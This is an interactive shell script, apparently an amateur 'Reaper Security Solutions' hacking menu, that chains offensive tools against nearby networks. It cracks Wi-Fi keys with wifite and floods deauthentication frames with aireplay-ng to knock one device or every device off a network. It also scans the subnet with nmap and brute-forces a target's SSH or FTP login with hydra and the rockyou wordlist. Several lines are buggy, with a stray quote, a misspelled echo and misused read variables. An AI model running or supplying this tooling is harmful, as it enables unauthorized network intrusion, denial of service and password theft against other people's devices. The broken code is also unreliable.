#!/bin/sh

D=$( date '+%A %B %d, %Y' )
T=$( date '+%r ' )
R=$( tput setaf 1 )
G=$( tput setaf 2 )
Y=$( tput setaf 3 )
FOUND=`grep "eth0:\|wlan0" /proc/net/dev`
IP=$( ip addr show dev wlan0 | sed -e's/^.*inet \([^ ]*\)\/.*$/\1/;t;d' )
IPP=$( ip addr show dev ccmni1 | sed -e's/^.*inet \([^ ]*\)\/.*$/\1/;t;d' )


while true
do
  echo " "
  echo $R"Reaper Security Solutions LLC"
  echo " "
  echo " "
  echo $G"        ~Welcome~"
  echo "It's currently $T"
  echo "on $D"
  echo " "
  echo " "
  if  [ -n "$FOUND" ] ; then
  echo "    your current ip is:"
  echo " "
  echo $Y"       $IP"
  else
  echo "your current mobile ip is:"
  echo " "
  echo " "
  echo " "
  echo " "
  echo $Y"$IPP"
  echo " "
  echo $G"connect to wifi for scan options"
  fi
  echo $G""
  echo ""
  echo $Y"1)$R use wlan0"
  echo $Y"2)$R use wlan1"
  echo " "
  echo $Y"x)$R exit"
  echo $G" "
  read -n 1 -p "adp: $R" usr_w
  if [ $usr_w == x ]
  then
    break
  fi
  if [ $usr_w == 1 ]
  then
    echo $G"        Main Menu"
    echo ""
    echo $Y"1)$R run wifite against network"
    echo $Y"2)$R block devices or networks"
    echo $Y"3)$R scan local wifi networks"
    echo $Y"4)$R fix wifi after mon mode"
    echo $Y"5)$R crack ssh of ftp server"
    echo $G" "
    read -n 1 -p "option $R: " user_op
    if [ $user_op == 1 ]
    then
      clear
      echo " "
      echo $Y"1)$R standard wordlist"
      echo $Y"2)$R custom wordlist option"
      echo $G" "
      read -n 1 -p "opt: $R" user_wl
      if [ $user_wl == 1 ]
      then
        sudo airmon-ng check kill
        sudo airmon-ng start wlan0
        sudo wifite
        echo " "
        echo $G"press$R y $Gto repair wifi or$R n$G to exit"
        echo $G" "
        read -n 1 -p "repair: $R" user_r
        if [ $user_r == y ]
        then
          sudo airmon-ng stop wlan0mon
          sleep 2
          sudo ifconfig wlan0 up
          sleep 1
          sudo service network-manager restart
          sudo service dhcpcd start
          sudo ifconfig
        fi
        if [ $user_r == n ]
        then
          break
        fi
      fi
      if [ $user_wl == 2 ]
      then
        echo $G" "
        echo "enter path to custom wordlist"
        echo " "
        read -p "path: $R" user_wlpath
        sudo airmon-ng check kill
        sudo airmon-ng start wlan0
        sudo wifite -dic $user_wlpath
        echo $G" "
        echo "press$R y$G to repair wifi or$R n$G to exit"
        echo $G" "
        read -n 1 -p "repair: $R" user_r
        if [ $user_r == y ]
        then
          sudo airmon-ng stop wlan0mon
          sleep 2
          sudo ifconfig wlan0 up
          sleep 1
          sudo service network-manager restart
          sudo service dhcpcd start
          sudo ifconfig
        fi
        if [ $user_r == n ]
        then
          break
        fi
      fi
    fi
    if [ $user_op == 2 ]
    then
      sudo airmon-ng check kill
      sudo airmon-ng start wlan0
      sudo airodump-ng wlan0mon
      echo $G" "
      echo "press$R a$G to block all devices"
      echo "press$R d$G to block one device"
      echo " "
      read -n 1 -p "block: $R" user_b
      if [ $user_b == a ]
      then
        echo $G" "
        echo "note the bssid of target wifi network"
        echo " "
        read -p "bssid: $R" $user_w
        sudo aireplay-ng -0 0 -a $user_w wlan0mon
      fi
      if [ $user_b == d ]
      then
        echo $G"note target wifi bssid and channel"
        read -p "bssid: $R" user_bss
        read -p $G"channel: $R" user_ch
        sudo airodump-ng -d $user_bss -c $user_ch wlan0mon
        echo $G"note device bssid to block"
        read -p "bssid: $R" user_target
        sudo aireplay-ng -0 0 -a $user_bss -c $user_target wlan0mon
      fi
      echo $G"press$R y$G to repair wifi or$R n$G to exit"
      echo " "
      read -n 1 -p "repair: $R" user_r
      if [ $user_r == y ]
      then
        sudo airmon-ng stop wlan0mon
        sleep 2
        sudo ifconfig wlan0 up
        sleep 1
        sudo service network-manager restart
        sudo service dhcpcd start
        sudo ifconfig
      fi
      if [ $user_r == n ]
      then
        break
      fi
    fi
    if [ $user_op == 3 ]
    then
      clear
      echo " "
      echo $Y"1)$G use nmap"
      echo $Y"2)$G use aircrack-ng"
      echo " "
      read -n 1 -p "scan: " user_scan
      if [ $user_scan == 1 ]
      then
        clear
        echo " "
        echo $G"select a nmap scan type:"
        echo " "
        echo " "
        echo $R"1)$G scan your device for open ports"
        echo $R"2)$G advanced scan of your device"
        echo $R"3)$G simple wifi scan for devices"
        echo $R"4)$G scan wifi for devices and ports"
        echo $R"5)$G advanced wifi scan, devices & ports"
        echo " "
        echo " "
        echo $R"v)$G view results file"
        echo $R"x)$Y exit"
        echo " "
        echo $R" "
        read -n 1 -p "scan:$G " user_s
        echo " "
        if [ $user_s == 1 ]
        then
          clear
          echo " "
          nmap $IP | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 5
          echo $G" "
        fi
        if [ $user_s == 2 ]
        then
          clear
          echo " "
          nmap -A $IP | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 6
          echo $G" "
        fi
        if [ $user_s == 3 ]
        then
          clear
          echo " "
          nmap -nP $IP/24 | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 6
          echo $G" "
        fi
        if [ $user_s == 4 ]
        then
          clear
          echo " "
          nmap $IP/24 | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 6
          echo $G" "
        fi
        if [ $user_s == 5 ]
        then
        clear
        echo " "
        nmap -A $IP/24 | tee -a scan-result.txt
        echo " "
        echo $R"results stored in scan-result.txt"
        sleep 6
        echo $G" "
        fi
        if [ $user_s == v ]
        then
          nano -c scan-result.txt
        fi
        if [ $user_s == x ]
        then
          clear
          break
        fi
      fi
      if [ $user_scan == 2 ]
      then
        sudo airmon-ng check kill
        sudo airmon-ng start wlan0
        sudo airodump-ng wlan0mon
        echo " "
        echo $G"press$R y$G to repair wifi or$R n$G to exit"
        echo $G" "
        read -n 1 -p "repair: $R" user_r
        if [ $user_r == y ]
        then
          sudo airmon-ng stop wlan0mon
          sleep 2
          sudo ifconfig wlan0 up
          sleep 1
          sudo service network-manager restart
          sudo service dhcpcd start
          sudo ifconfig
        fi
        if [ $user_r == n ]
        then
          break
        fi
      fi
    fi
    if [ $user_op == 4 ]
    then
      echo " "
      echo $G"press$R y$G to repair wifi or$R n$G to exit"
      echo " "
      read -n 1 -p "repair: $R" user_r
      if [ $user_r == y ]
      then
        sudo airmon-ng stop wlan0mon
        sleep 2
        sudo ifconfig wlan0 up
        sleep 1
        sudo service network-manager restart
        sudo service dhcpcd start
        sudo ifconfig
      fi
      if [ $user_r == n ]
      then
        break
      fi
    fi
    if [ $user_op == x ]
    then
      break
    fi
    if [ $user_op == 5 ]
    then
      clear
      sleep 1
      echo $G" "
      echo "$Rwarning $Gthis script assumes rockyou.txt is located in the"
      echo "home directory, if not then use the custom wordlist option"
      echo " "
      echo "Select an option to continue"
      echo " "
      echo $R"1)$G enter known target ip address"
      echo $R"2)$G scan for connected devices"
      echo " "
      read -p "option: $R" user_intent
      echo " "
      if [ $user_intent == 1 ]
      then
        sleep 1
        echo " "
        echo $G"enter the $Rtarget's$G ip address below"
        echo " "
        read -p "target ip: $R" user_target
        echo " "
        echo " "
        echo "$user_target $Gentered as target ip"
        echo " "
        echo "is this correct? enter $Ry$G/$Rn$G to proceed"
        echo " "
        read -p ": $R" user_con
        if [ $user_con == y ]
        then
          sleep 1
          echo " "
          echo "$user_target $Gselected as target ip"
          echo " "
          sleep 3
        fi
        if [ $user_con == n ]
        then
          echo " $(tput reset)"
          exit
        fi
      fi
      if [ $user_intent == 2 ]
      then
        sleep 1
        echo " $G"
        ifconfig
        echo " "
        echo $(tput setaf 4)"======================================================="
        echo " $G"
        echo "please locate your $Rinet ip$G address from above"
        echo " "
        echo "$Rreplace$G the $Rlast set$G of numbers with $R00"
        echo "$Gand then enter it below in this format."
        echo " "
        echo "example, if ip is $Y192.168.43.243$G then enter..."
        echo " $Y"
        echo "192.168.43.00"
        echo " $G"
        read -p "ip: $R" user_ip
        echo " "
        echo "$user_ip $Gselected, scan wifi for target devices?"
        echo " "
        read -p "scan? $Ry$G/$Rn$G: $R" user_scan
        if [ $user_scan == y ]
        then
          sleep 1
          echo " $G"
          nmap -sP $user_ip/24
          echo " "
          echo "connected devices show up as the following..."
          echo " "
          echo "Nmap scan report for 192.168.43.130"
          echo " "
          echo " "
          echo "select target device and enter its address below"
          echo " "
          read -p "target's ip: $R" user_target
          echo " "
          echo "$user_target $Gentered as target ip"
          echo " "
          echo "is this correct? enter $Ry$G/$Rn$G to proceed"
          echo " "
          read -p ": $R" user_con
          if [ $user_con == y ]
          then
            sleep 1
            echo " "
            echo "$user_target $Gselected as target ip"
            echo " "
            sleep 3
          fi
          if [ $user_con == n ]
          then
            echo "$(tput reset) "
            exit
          fi
        fi
        if [ $user_scan == n ]
        then
          sleep 1
        fi
      fi
      sleep 1
      echo " $G"
      echo "do you want to scan target for connections or ports?"
      echo " "
      read -p "scan $Ry$G/$Rn$G: $R" user_ps
      if [ $user_ps == y ]
      then
        sleep 1
        echo " $G"
        nmap -A -p 1-22 $user_target
        echo " "
        echo "look for the following:"
        echo " "
        echo "21/tcp open ftp"
        echo " "
        echo "and/or"
        echo " "
        echo "22/tcp open ssh"
        echo " "
        echo "open indicates the service is active and crackable"
        echo "closed indicates that the service is unavailable"
        echo " "
        echo "enter $Ry$G to crack a connection or $Rx$G to exit"
        echo " "
        read -p "continue?: $R" user_crk
        if [ $user_crk == y ]
        then
          sleep 1
        fi
        if [ $user_crk == x ]
        then
          echo "$(tput reset) "
          exit
        fi
      fi
      if [ user_ps == n ]
      then
        sleep 1
      fi
      sleep 1
      echo " $G"
      echo "select from the following options"
      echo " "
      echo $R"1)$G establish a ssh connection with target"
      echo $R"2)$G establish a ftp connection with target"
      echo $R"3)$G crack target device's ssh connection"
      echo $R"4)$G crack target device's ftp connection"
      echo " "
      read -p "option: $R" user_do
      if [ $user_do == 1 ]
      then
        sleep 1
        echo $G"starting ssh connection..."
        echo " "
        echo "enter the login credentials below"
        echo " "
        read -p "username: $R" user_name
        echo " "
        echo "$user_name $Gselected"
        echo " "
        echo "attempting to establish connection..."
        ssh $user_name@$user_target
      fi
      if [ $user_do == 2 ]
      then
        sleep 1
        echo $G"starting ftp connection..."
        echo " "
        echo "enter the login credentials below"
        echo " "
        read -p "username: $R" user_name
        echo " "
        read -p "username: " user_name
        echo "$user_name $Gselected"
        echo " "
        echo "attempting to establish connection..."
        ftp $user_name@$user_target
      fi
      if [ $user_do == 3 ]
      then
        echo " $G"
        echo "enter the ssh username you want to crack"
        echo " "
        read -p "username: $R" user_id
        echo " $G"
        echo "press $Rc$G to use a custom wordlist or $Rn$G to continue"
        echo " "
        read -p "custom wordlist? $R" user_cus
        if [ $user_cus == c ]
        then
          sleep 1
          echo " $G"
          echo "enter path to the wordlist you wish to use"
          echo " "
          echo "example, $HOME/rockyou.txt"
          echo " "
          read -p "path: $R" user_path
          echo " "
          sleep 1
          echo " $G"
          hydra -l $user_id -P $user_path $user_target ssh
          echo " "
        fi
        if [ $user_cus == n ]
        then
          sleep 1
          echo " $G"
          hydra -l $user_id -P $HOME/rockyou.txt $user_target ssh
          echo " "
        fi
      fi
      if [ $user_do == 4 ]
      then
        echo " $G"
        echo "enter the ftp username you want to crack"
        echo " "
        read -p "username: $R" user_id
        echo " $G"
        echo "press $Rc$G to use a custom wordlist or $Rn$G to continue"
        echo " "
        read -p "custom wordlist? $R" user_cus
        if [ $user_cus == c ]
        then
          sleep 1
          echo " $G"
          echo "enter path to custom wordlist"
          echo " "
          echo "example, $HOME/rockyou.txt"
          echo " "
          read -p "path: $R" user_path
          echo " $G"
          sleep 1
          echo " "
          hydra -l $user_id -P $user_path $user_target ftp
          echo " "
        fi
        if [ $user_cus == n ]
        then
          sleep 1
          echo " $G"
          hydra -l $user_id -P $HOME/rockyou.txt $user_target ftp
          echo " "
        fi
      fi
    fi
  fi
  if [ $usr_w == 2 ]
  then"
    echo $Y"        Main Menu"
    echo ""
    echo $Y"1)$R run wifite against network"
    echo $Y"2)$R block devices or networks"
    echo $Y"3)$R scan local wifi networks"
    echo $Y"4)$R fix wifi after mon mode"
    echo $Y"5)$R crack ssh of ftp server"
    echo $G" "
    read -n 1 -p "option: $R" user_op
    if [ $user_op == 1 ]
    then
      clear
      echo " "
      echo $Y"1)$R standard wordlist"
      echo $Y"2)$R custom wordlist option"
      echo $G" "
      read -n 1 -p "opt: $R" user_wl
      if [ $user_wl == 1 ]
      then
        sudo airmon-ng check kill
        sudo airmon-ng start wlan1
        sudo wifite
        echo " "
        echo $G"press$R y$G to repair wifi or$R n$G to exit"
        echo $G" "
        read -n 1 -p "repair: $R" user_r
        if [ $user_r == y ]
        then
          sudo airmon-ng stop wlan1mon
          sleep 2
          sudo ifconfig wlan1 up
          sleep 1
          sudo service network-manager restart
          sudo service dhcpcd start
          sudo ifconfig
        fi
        if [ $user_r == n ]
        then
          break
        fi
      fi
      if [ $user_wl == 2 ]
      then
        echo $G" "
        echo "enter path to custom wordlist"
        echo " "
        read -p "path: $R" user_wlpath
        sudo airmon-ng check kill
        sudo airmon-ng start wlan1
        sudo wifite -dic $user_wlpath
        echo " "
        echo $G"press$R y$G to repair wifi or$R n$G to exit"
        echo " "
        read -n 1 -p "repair: $R" user_r
        if [ $user_r == y ]
        then
          sudo airmon-ng stop wlan1mon
          sleep 2
          sudo ifconfig wlan1 up
          sleep 1
          sudo service network-manager restart
          sudo service dhcpcd start
          sudo ifconfig
        fi
        if [ $user_r == n ]
        then
          break
        fi
      fi
    fi
    if [ $user_op == 2 ]
    then
      sudo airmon-ng check kill
      sudo airmon-ng start wlan1
      sudo airodump-ng wlan1mon
      echo " "
      echo $G"press$R a$G to block all devices"
      echo $G"press$R d$G to block one device"
      echp " "
      read -n 1 -p "block: $R" user_b
      if [ $user_b == a ]
      then
        echo " "
        echo $G"note the bssid of target wifi network"
        echo " "
        read -p "bssid: $R" $user_w
        sudo aireplay-ng -0 0 -a $user_w wlan1mon
      fi
      if [ $user_b == d ]
      then
        echo $G"note target wifi bssid and channel"
        read -p $G"bssid: $R" user_bss
        read -p $G"channel: $R" user_ch
        sudo airodump-ng -d $user_bss -c $user_ch wlan1mon
        echo $G"note device bssid to block"
        read -p "bssid: $R" user_target
        sudo aireplay-ng -0 0 -a $user_bss -c $user_target wlan1mon
      fi
      echo $G"press$R y$G to repair wifi or$R na$G to exit"
      echo " "
      read -n 1 -p "repair: $R" user_r
      if [ $user_r == y ]
      then
        sudo airmon-ng stop wlan1mon
        sleep 2
        sudo ifconfig wlan1 up
        sleep 1
        sudo service network-manager restart
        sudo service dhcpcd start
        sudo ifconfig
      fi
      if [ $user_r == n ]
      then
        exit
      fi
    fi
    if [ $user_op == 3 ]
    then
      clear
      echo " "
      echo $Y"1)$R use nmap"
      echo $Y"2)$R use aircrack-ng"
      if [ $user_scan == 1 ]
      then
        clear
        echo " "
        echo $G"select a nmap scan type:"
        echo " "
        echo " "
        echo $R"1)$G scan your device for open ports"
        echo $R"2)$G advanced scan of your device"
        echo $R"3)$G simple wifi scan for devices"
        echo $R"4)$G scan wifi for devices and ports"
        echo $R"5)$G advanced wifi scan, devices & ports"
        echo " "
        echo " "
        echo $R"v)$G view results file"
        echo $R"x)$Y exit"
        echo " "
        echo $R" "
        read -n 1 -p "scan:$G " user_s
        echo " "
        if [ $user_s == 1 ]
        then
          clear
          echo " "
          nmap $IP | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 5
          echo $G" "
        fi
        if [ $user_s == 2 ]
        then
          clear
          echo " "
          nmap -A $IP | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 6
          echo $G" "
        fi
        if [ $user_s == 3 ]
        then
          clear
          echo " "
          nmap -nP $IP/24 | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 6
          echo $G" "
        fi
        if [ $user_s == 4 ]
        then
          clear
          echo " "
          nmap $IP/24 | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 6
          echo $G" "
        fi
        if [ $user_s == 5 ]
        then
        clear
        echo " "
        nmap -A $IP/24 | tee -a scan-result.txt
        echo " "
        echo $R"results stored in scan-result.txt"
        sleep 6
        echo $G" "
        fi
        if [ $user_s == v ]
        then
          nano -c scan-result.txt
        fi
        if [ $user_s == x ]
        then
          clear
          exit
        fi
      fi
      if [ $user_scan == 2 ]
      then
        sudo airmon-ng check kill
        sudo airmon-ng start wlan1
        sudo airodump-ng wlan1mon
        echo " "
        echo $G"press$R y$G to repair wifi or$R n$G to exit"
        echo " "
        read -n 1 -p "repair: $R" user_r
        if [ $user_r == y ]
        then
          sudo airmon-ng stop wlan1mon
          sleep 2
          sudo ifconfig wlan1 up
          sleep 1
          sudo service network-manager restart
          sudo service dhcpcd start
          sudo ifconfig
        fi
        if [ $user_r == n ]
        then
          exit
        fi
      fi
    fi
    if [ $user_op == 4 ]
    then
      echo " "
      echo $G"press$R y$G to repair wifi or$R n$G to exit"
      echo " "
      read -n 1 -p "repair: $R" user_r
      if [ $user_r == y ]
      then
        sudo airmon-ng stop wlan1mon
        sleep 2
        sudo ifconfig wlan1 up
        sleep 1
        sudo service network-manager restart
        sudo service dhcpcd start
        sudo ifconfig
      fi
      if [ $user_r == n ]
      then
        exit
      fi
    fi
    if [ $user_op == x ]
    then
      exit
    fi
    if [ $user_op == 5 ]
    then
      clear
      sleep 1
      echo $G" "
      echo "$Rwarning $Gthis script assumes rockyou.txt is located in the"
      echo "home directory, if not then use the custom wordlist option"
      echo " "
      echo "Select an option to continue"
      echo " "
      echo $R"1)$G enter known target ip address"
      echo $R"2)$G scan for connected devices"
      echo " "
      read -p "option: $R" user_intent
      echo " "
      if [ $user_intent == 1 ]
      then
        sleep 1
        echo " "
        echo $G"enter the $Rtarget's$G ip address below"
        echo " "
        read -p "target ip: $R" user_target
        echo " "
        echo " "
        echo "$user_target $Gentered as target ip"
        echo " "
        echo "is this correct? enter $Ry$G/$Rn$G to proceed"
        echo " "
        read -p ": $R" user_con
        if [ $user_con == y ]
        then
          sleep 1
          echo " "
          echo "$user_target $Gselected as target ip"
          echo " "
          sleep 3
        fi
        if [ $user_con == n ]
        then
          echo " $(tput reset)"
          exit
        fi
      fi
      if [ $user_intent == 2 ]
      then
        sleep 1
        echo " $G"
        ifconfig
        echo " "
        echo $(tput setaf 4)"======================================================="
        echo " $G"
        echo "please locate your $Rinet ip$G address from above"
        echo " "
        echo "$Rreplace$G the $Rlast set$G of numbers with $R00"
        echo "$Gand then enter it below in this format."
        echo " "
        echo "example, if ip is $Y192.168.43.243$G then enter..."
        echo " $Y"
        echo "192.168.43.00"
        echo " $G"
        read -p "ip: $R" user_ip
        echo " "
        echo "$user_ip $Gselected, scan wifi for target devices?"
        echo " "
        read -p "scan? $Ry$G/$Rn$G: $R" user_scan
        if [ $user_scan == y ]
        then
          sleep 1
          echo " $G"
          nmap -sP $user_ip/24
          echo " "
          echo "connected devices show up as the following..."
          echo " "
          echo "Nmap scan report for 192.168.43.130"
          echo " "
          echo " "
          echo "select target device and enter its address below"
          echo " "
          read -p "target's ip: $R" user_target
          echo " "
          echo "$user_target $Gentered as target ip"
          echo " "
          echo "is this correct? enter $Ry$G/$Rn$G to proceed"
          echo " "
          read -p ": $R" user_con
          if [ $user_con == y ]
          then
            sleep 1
            echo " "
            echo "$user_target $Gselected as target ip"
            echo " "
            sleep 3
          fi
          if [ $user_con == n ]
          then
            echo "$(tput reset) "
            exit
          fi
        fi
        if [ $user_scan == n ]
        then
          sleep 1
        fi
      fi
      sleep 1
      echo " $G"
      echo "do you want to scan target for connections or ports?"
      echo " "
      read -p "scan $Ry$G/$Rn$G: $R" user_ps
      if [ $user_ps == y ]
      then
        sleep 1
        echo " $G"
        nmap -A -p 1-22 $user_target
        echo " "
        echo "look for the following:"
        echo " "
        echo "21/tcp open ftp"
        echo " "
        echo "and/or"
        echo " "
        echo "22/tcp open ssh"
        echo " "
        echo "open indicates the service is active and crackable"
        echo "closed indicates that the service is unavailable"
        echo " "
        echo "enter $Ry$G to crack a connection or $Rx$G to exit"
        echo " "
        read -p "continue?: $R" user_crk
        if [ $user_crk == y ]
        then
          sleep 1
        fi
        if [ $user_crk == x ]
        then
          echo "$(tput reset) "
          exit
        fi
      fi
      if [ user_ps == n ]
      then
        sleep 1
      fi
      sleep 1
      echo " $G"
      echo "select from the following options"
      echo " "
      echo $R"1)$G establish a ssh connection with target"
      echo $R"2)$G establish a ftp connection with target"
      echo $R"3)$G crack target device's ssh connection"
      echo $R"4)$G crack target device's ftp connection"
      echo " "
      read -p "option: $R" user_do
      if [ $user_do == 1 ]
      then
        sleep 1
        echo $G"starting ssh connection..."
        echo " "
        echo "enter the login credentials below"
        echo " "
        read -p "username: $R" user_name
        echo " "
        echo "$user_name $Gselected"
        echo " "
        echo "attempting to establish connection..."
        ssh $user_name@$user_target
      fi
      if [ $user_do == 2 ]
      then
        sleep 1
        echo $G"starting ftp connection..."
        echo " "
        echo "enter the login credentials below"
        echo " "
        read -p "username: $R" user_name
        echo " "
        read -p "username: " user_name
        echo "$user_name $Gselected"
        echo " "
        echo "attempting to establish connection..."
        ftp $user_name@$user_target
      fi
      if [ $user_do == 3 ]
      then
        echo " $G"
        echo "enter the ssh username you want to crack"
        echo " "
        read -p "username: $R" user_id
        echo " $G"
        echo "press $Rc$G to use a custom wordlist or $Rn$G to continue"
        echo " "
        read -p "custom wordlist? $R" user_cus
        if [ $user_cus == c ]
        then
          sleep 1
          echo " $G"
          echo "enter path to the wordlist you wish to use"
          echo " "
          echo "example, $HOME/rockyou.txt"
          echo " "
          read -p "path: $R" user_path
          echo " "
          sleep 1
          echo " $G"
          hydra -l $user_id -P $user_path $user_target ssh
          echo " "
        fi
        if [ $user_cus == n ]
        then
          sleep 1
          echo " $G"
          hydra -l $user_id -P $HOME/rockyou.txt $user_target ssh
          echo " "
        fi
      fi
      if [ $user_do == 4 ]
      then
        echo " $G"
        echo "enter the ftp username you want to crack"
        echo " "
        read -p "username: $R" user_id
        echo " $G"
        echo "press $Rc$G to use a custom wordlist or $Rn$G to continue"
        echo " "
        read -p "custom wordlist? $R" user_cus
        if [ $user_cus == c ]
        then
          sleep 1
          echo " $G"
          echo "enter path to custom wordlist"
          echo " "
          echo "example, $HOME/rockyou.txt"
          echo " "
          read -p "path: $R" user_path
          echo " $G"
          sleep 1
          echo " "
          hydra -l $user_id -P $user_path $user_target ftp
          echo " "
        fi
        if [ $user_cus == n ]
        then
          sleep 1
          echo " $G"
          hydra -l $user_id -P $HOME/rockyou.txt $user_target ftp
          echo " "
        fi
      fi
    fi
  fi
done

